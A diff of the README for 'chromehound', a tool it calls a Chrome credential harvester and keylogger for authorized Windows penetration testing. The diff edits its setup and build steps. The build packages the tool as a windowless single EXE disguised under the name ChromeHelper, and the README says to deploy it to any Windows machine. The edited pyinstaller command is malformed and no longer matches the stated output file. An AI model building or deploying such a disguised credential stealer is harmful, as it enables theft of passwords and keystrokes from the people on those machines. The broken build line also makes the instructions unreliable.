@@ -27,17 +27,13 @@ Chrome credential harvester + keylogger for authorized Windows penetration testi
 pip install pycryptodomex pypiwin32 requests
 ```
 
-3. Run directly (requires Python on target):
-
-```
-python chromehound.py
-```
-
 ## Build standalone EXE (no Python needed on target)
 
 ```
+cd downloads
+pip install pycryptodomex pypiwin32 requests
 pip install pyinstaller
-pyinstaller --onefile --noconsole --name ChromeHelper chromehound.py
+pyinstaller --onefile --noconsole --name chromehound.py
 ```
 
 Output: `dist/ChromeHelper.exe` — single file, ~10 MB. Deploy to any Windows machine.
